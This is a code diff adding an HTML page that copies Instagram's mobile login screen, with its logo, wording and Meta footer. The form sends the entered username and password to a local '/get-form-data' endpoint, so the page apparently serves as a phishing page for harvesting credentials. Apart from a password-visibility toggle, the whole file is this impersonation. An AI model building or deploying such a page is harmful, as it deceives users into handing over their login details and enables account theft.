@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    background: #fff;
+  }
+  .screen {
+    width: 100%;
+    max-width: 420px;
+    padding: 18px 24px;
+    min-height: 100vh;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+  }
+  .back-arrow {
+    font-size: 26px;
+    cursor: pointer;
+    width: 26px;
+  }
+  .lang {
+    text-align: center;
+    color: #737373;
+    margin-top: 6px;
+    font-size: 17px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+  }
+  .lang svg { width: 14px; height: 14px; fill: #737373; margin-top: 2px; }
+  .meta-logo {
+    text-align: center;
+    margin-top: 28px;
+    font-size: 34px;
+    font-weight: 700;
+    color: #0064e0;
+    line-height: 1;
+    font-family: Georgia, 'Times New Roman', serif;
+  }
+  .insta-icon {
+    display: flex;
+    margin: 36px auto 50px;
+    width: 64px;
+    height: 64px;
+    align-items: center;
+    justify-content: center;
+  }
+  .insta-icon svg { width: 64px; height: 64px; }
+
+  .input-wrap {
+    position: relative;
+    border: 1px solid #dbdbdb;
+    border-radius: 10px;
+    margin-top: 14px;
+    padding: 8px 14px 6px;
+  }
+  .input-wrap label {
+    display: block;
+    color: #8e8e8e;
+    font-size: 14px;
+    line-height: 1.2;
+  }
+  .input-wrap input {
+    width: 100%;
+    border: none;
+    outline: none;
+    font-size: 16px;
+    padding: 2px 0 2px;
+    color: #000;
+    background: transparent;
+  }
+  .input-wrap.empty label {
+    position: absolute;
+    top: 50%;
+    left: 14px;
+    transform: translateY(-50%);
+    font-size: 16px;
+    color: #8e8e8e;
+    pointer-events: none;
+  }
+  .input-wrap.empty input { padding-top: 10px; }
+  .input-wrap.empty input { padding-right: 34px; }
+  .eye-toggle {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    padding: 0;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.15s ease;
+  }
+  .eye-toggle svg {
+    width: 22px;
+    height: 22px;
+  }
+  .input-wrap.empty:focus-within .eye-toggle {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .login-btn {
+    width: 100%;
+    padding: 14px;
+    margin-top: 18px;
+    background: #0d6efd;
+    color: #fff;
+    border: none;
+    border-radius: 24px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .forgot {
+    text-align: center;
+    margin-top: 22px;
+    font-size: 15px;
+    font-weight: 600;
+    color: #000;
+    cursor: pointer;
+  }
+  .spacer { flex: 1; min-height: 40px; }
+  .create-account {
+    width: 100%;
+    padding: 13px;
+    background: #fff;
+    color: #0d6efd;
+    border: 1px solid #0d6efd;
+    border-radius: 24px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .meta-footer {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    margin: 22px 0 10px;
+    font-weight: 600;
+    color: #000;
+    font-size: 19px;
+  }
+  .meta-footer .infinity {
+    font-size: 24px;
+    font-weight: 700;
+    color: #0064e0;
+    font-family: Georgia, 'Times New Roman', serif;
+    line-height: 1;
+  }
+</style>
+</head>
+<body>
+
+<div class="screen">
+  <div class="back-arrow">&#8592;</div>
+
+  <div class="lang">
+    English (UK)
+    <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+  </div>
+
+  <div class="insta-icon">
+    <svg viewBox="0 0 96 96" fill="none">
+      <defs>
+        <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
+          <stop offset="0%" stop-color="#fdf497"/>
+          <stop offset="5%" stop-color="#fdf497"/>
+          <stop offset="45%" stop-color="#fd5949"/>
+          <stop offset="60%" stop-color="#d6249f"/>
+          <stop offset="90%" stop-color="#8134af"/>
+          <stop offset="100%" stop-color="#5851db"/>
+        </radialGradient>
+      </defs>
+      <rect x="4" y="4" width="88" height="88" rx="22" ry="22" stroke="url(#igGrad)" stroke-width="6"/>
+      <circle cx="48" cy="48" r="21" stroke="url(#igGrad)" stroke-width="6"/>
+      <circle cx="70" cy="26" r="4.5" fill="url(#igGrad)"/>
+    </svg>
+  </div>
+
+  <form action="/get-form-data" method="POST">
+    <div class="input-wrap">
+      <label>Username, email address or mobile number</label>
+      <input type="text" name="username" >
+    </div>
+    <div class="input-wrap empty">
+      <label>Password</label>
+      <input type="password" name="password" id="passwordField">
+      <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
+        <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="#737373" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-7-11-7a21.86 21.86 0 0 1 5.06-6.06"/>
+          <path d="M9.9 4.24A10.4 10.4 0 0 1 12 4c7 0 11 7 11 7a21.8 21.8 0 0 1-2.16 3.19"/>
+          <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+        </svg>
+      </button>
+    </div>
+    <button type="submit" class="login-btn">Log in</button>
+  </form>
+
+  <div class="forgot">Forgotten password?</div>
+
+  <div class="spacer"></div>
+
+  <button class="create-account">Create new account</button>
+
+  <div class="meta-footer">
+    <span class="infinity">&infin;</span> Meta
+  </div>
+</div>
+
+
+<script>
+  const eyeToggle = document.getElementById('eyeToggle');
+  const passwordField = document.getElementById('passwordField');
+  const eyeIcon = document.getElementById('eyeIcon');
+
+  const eyeOpenSVG = `
+    <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
+    <circle cx="12" cy="12" r="3"/>
+  `;
+
+  const eyeClosedSVG = `
+    <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-7-11-7a21.86 21.86 0 0 1 5.06-6.06"/>
+    <path d="M9.9 4.24A10.4 10.4 0 0 1 12 4c7 0 11 7 11 7a21.8 21.8 0 0 1-2.16 3.19"/>
+    <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+    <line x1="1" y1="1" x2="23" y2="23"/>
+  `;
+
+  let visible = false;
+
+  eyeToggle.addEventListener('click', () => {
+    visible = !visible;
+    passwordField.type = visible ? 'text' : 'password';
+    eyeIcon.innerHTML = visible ? eyeOpenSVG : eyeClosedSVG;
+    eyeToggle.setAttribute('aria-label', visible ? 'Hide password' : 'Show password');
+  });
+</script>
+
+</body>
+</html>
